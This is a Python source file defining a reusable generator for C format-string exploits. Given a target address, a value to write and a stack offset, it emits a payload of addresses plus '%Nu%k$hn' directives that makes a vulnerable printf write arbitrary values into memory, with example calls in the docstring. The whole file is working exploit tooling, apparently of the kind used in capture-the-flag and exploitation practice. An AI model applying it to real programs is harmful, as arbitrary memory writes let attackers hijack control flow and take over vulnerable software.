from typing import Union
def format_string_exploit(
    address_to_write_to   : Union[bytes, int], # where you do want to write
    address_to_be_written : Union[bytes, int], # what address you do want to write
    cstring_stack_offset  : int,           # number of the c format string on the stack
    cstring_prefix        : bytes  = b"",  # prefix before the addresses
    cstring_interfix      : bytes  = b"",  # separating the addresses from the format exploit
    endianness : str = "little", # architecture endianness
    arch_bits  : int = 32,       # architecture bits
    param_endianness: str= "big",# endianness of int addresses params
):
    """
    Build c format string exploits in a blink
    
    print(format_string_exploit(
        0xbffff6ac,
        0xcafebabe,
        7
    ))
    print(format_string_exploit(
        b"\xbf\xff\xf6\xac",
        b"\xca\xfe\xba\xbe",
        7
    ))
    """
    arch_bytes      = arch_bits // 8
    half_arch_bytes = arch_bytes // 2

    n2b = lambda n, nb = arch_bytes: n.to_bytes(nb, endianness)
    b2n = lambda b: int.from_bytes(b, endianness)

    if isinstance(address_to_write_to, int):
        address_to_write_to = address_to_write_to.to_bytes(arch_bytes, param_endianness)
    if isinstance(address_to_be_written, int):
        address_to_be_written=address_to_be_written.to_bytes(arch_bytes, param_endianness)

    # 1 address to write to, 1 address to be written.
    if not (
        len(address_to_write_to) == len(address_to_be_written) == arch_bytes 
    ):
        raise ValueError("Addresses size do not match with architecture bits")
    
    # if a prefix exists it must be of a multiple of arch_bytes
    # to let the address_to_write_to being pointed to as a parameter from the stack
    if not (
        len(cstring_prefix) % arch_bytes == 0
    ):
        raise ValueError("Prefix length must be a multiple of {}".format(arch_bytes))
        
    address_stack_offset = len(cstring_prefix) // arch_bytes
    
    if (endianness == "little") and (param_endianness != endianness):
        address_to_write_to = address_to_write_to[::-1]
        address_to_be_written=address_to_be_written[::-1]
    
    # split the address_to_be_written in 2 parts for the format exploit
    first_n = b2n(address_to_be_written[half_arch_bytes:] if endianness == "little" else address_to_be_written[:half_arch_bytes])
    second_n= b2n(address_to_be_written[:half_arch_bytes] if endianness == "little" else address_to_be_written[half_arch_bytes:])
    
    # cannot write the same number in both halves
    if not (first_n != second_n):
        raise ValueError("With this method you can't write the same number twice. The address_to_be_written must not be splitted in 2 equal parts.")
    
    # if the second_n is < first_n we'll need to swap the addresses where to write
    # this is because the first_n bytes will be written and to write the second_n we
    # will need only the difference
    reverse_ns = first_n > second_n
    int_parts = [second_n, first_n] if reverse_ns else [first_n, second_n]
    
    # get the memory address of the second half of the address_to_write_to
    address_to_write_to_h2 = n2b(b2n(address_to_write_to) + half_arch_bytes)
    
    addresses_to_write_to = b"".join(
        [address_to_write_to, address_to_write_to_h2]
        if reverse_ns else 
        [address_to_write_to_h2, address_to_write_to]
    )
    
    ret = b"".join((
        cstring_prefix,
        addresses_to_write_to,
        cstring_interfix
    ))
    
    format_exploit = ""
    bytes_outputted= len(ret)
    param_number   = cstring_stack_offset + address_stack_offset
    u_number       = int_parts[0] - bytes_outputted
    format_exploit += f"%{u_number}u%{param_number}$hn"
    bytes_outputted+= u_number
    u_number       = int_parts[1] - bytes_outputted
    param_number   += 1
    format_exploit += f"%{u_number}u%{param_number}$hn"
    format_exploit = format_exploit.encode('ascii')
    
    ret += format_exploit
    return ret

# TODO
# TESTS needed
